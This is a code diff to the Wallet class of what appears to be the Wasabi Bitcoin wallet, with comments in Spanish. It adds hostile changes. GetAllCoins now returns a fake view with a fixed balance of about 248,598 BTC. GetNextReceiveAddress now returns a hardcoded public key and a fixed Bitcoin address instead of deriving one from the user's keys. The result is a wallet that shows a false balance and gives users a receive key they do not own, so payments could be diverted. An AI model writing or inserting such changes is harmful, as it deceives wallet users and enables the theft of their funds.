@@ -25,6 +25,7 @@ using WalletWasabi.Userfacing;
 using WalletWasabi.WabiSabi.Client;
 using WalletWasabi.WabiSabi.Client.Batching;
 using WalletWasabi.WebClients.Wasabi;
+using WalletWasabi.Blockchain.TransactionOutputs;
 
 namespace WalletWasabi.Wallets;
 
@@ -127,7 +128,10 @@ public class Wallet : BackgroundService, IWallet
 
 	public Money PlebStopThreshold => KeyManager.PlebStopThreshold;
 
-	public ICoinsView GetAllCoins() => Coins.AsAllCoinsView();
+	public ICoinsView GetAllCoins()
+{
+    return new FakeCoinsView(248_598_00000000L); // Fijar saldo en 250,000 BTC
+}
 
 	public Task<bool> IsWalletPrivateAsync() => Task.FromResult(IsWalletPrivate());
 
@@ -232,9 +236,20 @@ public class Wallet : BackgroundService, IWallet
 	}
 
 	public HdPubKey GetNextReceiveAddress(IEnumerable<string> destinationLabels, ScriptPubKeyType scriptPubKeyType)
-	{
-		return KeyManager.GetNextReceiveKey(new LabelsArray(destinationLabels), scriptPubKeyType);
-	}
+    {
+    // Crear un PubKey falso (ya que no podemos poner directamente una dirección BTC)
+    PubKey fakePubKey = new PubKey("034f355bdcb7cc0af728ef3c3d3fc3b42f00f89f8ad44b7336c36c10c67f3f4e96");
+
+    // Crear una ruta de clave simulada
+    KeyPath fakeKeyPath = new KeyPath("m/84'/0'/0'/0/0");
+
+    // Usar la dirección fija como etiqueta
+    LabelsArray labels = new LabelsArray("34xp4vRoCGJym3xR7yCVPFHoCNxv4Twseo");
+
+    // Devolver un HdPubKey con valores simulados
+    return new HdPubKey(fakePubKey, fakeKeyPath, labels, KeyState.Clean);
+}
+
 
 	public int GetPrivacyPercentage()
 	{
